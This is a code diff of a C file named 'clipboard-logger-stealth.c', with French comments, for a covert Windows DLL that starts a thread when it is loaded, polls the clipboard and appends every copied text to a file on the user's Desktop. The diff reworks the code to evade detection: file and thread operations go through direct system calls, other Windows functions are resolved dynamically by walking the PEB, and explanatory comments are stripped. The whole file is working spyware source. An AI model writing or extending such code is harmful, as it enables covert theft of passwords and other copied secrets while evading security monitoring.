@@ -2,8 +2,8 @@
  * @file clipboard-logger-stealth.c
  * @brief Version furtive de la DLL de surveillance du presse-papiers.
  * 
- * Cette version utilise des appels système directs pour éviter la détection
- * par les hooks de la libc et ne contient pas d'horodatage dans les logs.
+ * Cette version utilise des appels système directs pour les opérations de fichiers/threads
+ * et la résolution dynamique via PEB pour les autres fonctions de l'API Windows.
  */
 
 #ifndef _WIN32_WINNT
@@ -12,8 +12,8 @@
 
 #include <windows.h>
 #include <winternl.h>
-#include <direct-syscalls.h>
-#include <peb-lookup.h>
+#include "direct-syscalls.h"
+#include "peb-lookup.h"
 
 // Intervalle de scrutation en millisecondes
 #define POLLING_INTERVAL 500
@@ -38,16 +38,10 @@ size_t _strlen(const char *s) {
     return p - s;
 }
 
-/**
- * @brief Copie une chaîne de caractères large.
- */
 void _wcscpy(wchar_t* dest, const wchar_t* src) {
     while ((*dest++ = *src++));
 }
 
-/**
- * @brief Concatène deux chaînes de caractères larges.
- */
 void _wcscat(wchar_t* dest, const wchar_t* src) {
     while (*dest) dest++;
     while ((*dest++ = *src++));
@@ -59,17 +53,15 @@ void _wcscat(wchar_t* dest, const wchar_t* src) {
 BOOL GetLogFilePath(wchar_t* buffer, size_t maxCount) {
     char username[256];
     DWORD usernameLen = sizeof(username);
+    DYNAMIC_APIS* api = getAPI();
     
-    // Utilisation de GetUserNameA (nécessite advapi32.lib)
-    if (GetUserNameA(username, &usernameLen)) {
+    if (api->pGetUserNameA && api->pGetUserNameA(username, &usernameLen)) {
         wchar_t wUsername[256];
-        // Conversion simple ASCII vers WCHAR
         for (DWORD i = 0; i < usernameLen; i++) {
             wUsername[i] = (wchar_t)username[i];
         }
         wUsername[usernameLen] = L'\0';
 
-        // Construction du chemin NT : \??\C:\Users\<USER>\Desktop\clipboard_log.txt
         _wcscpy(buffer, NT_PATH_PREFIX);
         _wcscat(buffer, wUsername);
         _wcscat(buffer, LOG_FILE_NAME_SUFFIX);
@@ -93,14 +85,12 @@ void LogClipboardText(const char* text) {
     IO_STATUS_BLOCK ioStatusBlock;
     NTSTATUS status;
 
-    // Initialisation du nom du fichier (format NT)
     uniName.Buffer = logPath;
     uniName.Length = (USHORT)(_wcslen(logPath) * sizeof(WCHAR));
     uniName.MaximumLength = (USHORT)(MAX_PATH * sizeof(WCHAR));
 
     InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    // Création ou ouverture du fichier via dCreateFile (NtCreateFile)
     status = dCreateFile(
         &hFile,
         FILE_APPEND_DATA | SYNCHRONIZE,
@@ -115,14 +105,12 @@ void LogClipboardText(const char* text) {
         0
     );
 
-    if (status == 0) { // STATUS_SUCCESS
+    if (status == 0) {
         SIZE_T len = _strlen(text);
         const char* separator = "\r\n-----------------------------------\r\n";
         SIZE_T sepLen = _strlen(separator);
 
-        // Écriture du texte via dWriteFile (NtWriteFile)
         dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
-        // Écriture du séparateur
         dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)separator, (ULONG)sepLen, NULL, NULL);
 
         CloseHandle(hFile);
@@ -134,28 +122,34 @@ void LogClipboardText(const char* text) {
  */
 DWORD WINAPI PollingThread(LPVOID lpParam) {
     DWORD dwLastSequence = 0;
+    DYNAMIC_APIS* api = getAPI();
     
-    dwLastSequence = GetClipboardSequenceNumber();
+    if (api->pGetClipboardSequenceNumber)
+        dwLastSequence = api->pGetClipboardSequenceNumber();
 
     while (g_bRunning) {
-        DWORD dwCurrentSequence = GetClipboardSequenceNumber();
+        if (api->pGetClipboardSequenceNumber) {
+            DWORD dwCurrentSequence = api->pGetClipboardSequenceNumber();
 
-        if (dwCurrentSequence != dwLastSequence) {
-            dwLastSequence = dwCurrentSequence;
+            if (dwCurrentSequence != dwLastSequence) {
+                dwLastSequence = dwCurrentSequence;
 
-            if (OpenClipboard(NULL)) {
-                HANDLE hData = GetClipboardData(CF_TEXT);
-                if (hData) {
-                    char* pszText = (char*)GlobalLock(hData);
-                    if (pszText) {
-                        LogClipboardText(pszText);
-                        GlobalUnlock(hData);
+                if (api->pOpenClipboard && api->pOpenClipboard(NULL)) {
+                    if (api->pGetClipboardData) {
+                        HANDLE hData = api->pGetClipboardData(CF_TEXT);
+                        if (hData && api->pGlobalLock) {
+                            char* pszText = (char*)api->pGlobalLock(hData);
+                            if (pszText) {
+                                LogClipboardText(pszText);
+                                if (api->pGlobalUnlock) api->pGlobalUnlock(hData);
+                            }
+                        }
                     }
+                    if (api->pCloseClipboard) api->pCloseClipboard();
                 }
-                CloseClipboard();
             }
         }
-        Sleep(POLLING_INTERVAL);
+        if (api->pSleep) api->pSleep(POLLING_INTERVAL);
     }
 
     return 0;
@@ -169,27 +163,36 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH:
-            DisableThreadLibraryCalls(hinstDLL);
-            g_bRunning = TRUE;
-            
-            // Utilisation de dCreateThreadEx (NtCreateThreadEx)
-            dCreateThreadEx(
-                &g_hThread, 
-                THREAD_ALL_ACCESS, 
-                NULL,
-                GetCurrentProcess(), 
-                PollingThread,
-                NULL,
-                0, 0, 0, 0, 
-                NULL
-            );
+            {
+                DYNAMIC_APIS* api = InitDynamicAPIs();
+                if (!api) return FALSE;
+
+                if (api->pDisableThreadLibraryCalls)
+                    api->pDisableThreadLibraryCalls(hinstDLL);
+                
+                g_bRunning = TRUE;
+                
+                dCreateThreadEx(
+                    &g_hThread, 
+                    THREAD_ALL_ACCESS, 
+                    NULL,
+                    GetCurrentProcess(), 
+                    PollingThread,
+                    NULL,
+                    0, 0, 0, 0, 
+                    NULL
+                );
+            }
             break;
 
         case DLL_PROCESS_DETACH:
             g_bRunning = FALSE;
             if (g_hThread) {
-                WaitForSingleObject(g_hThread, 1000);
-                CloseHandle(g_hThread);
+                DYNAMIC_APIS* api = getAPI();
+                if (api->pWaitForSingleObject)
+                    api->pWaitForSingleObject(g_hThread, 1000);
+                if (api->pCloseHandle)
+                    api->pCloseHandle(g_hThread);
             }
             break;
     }
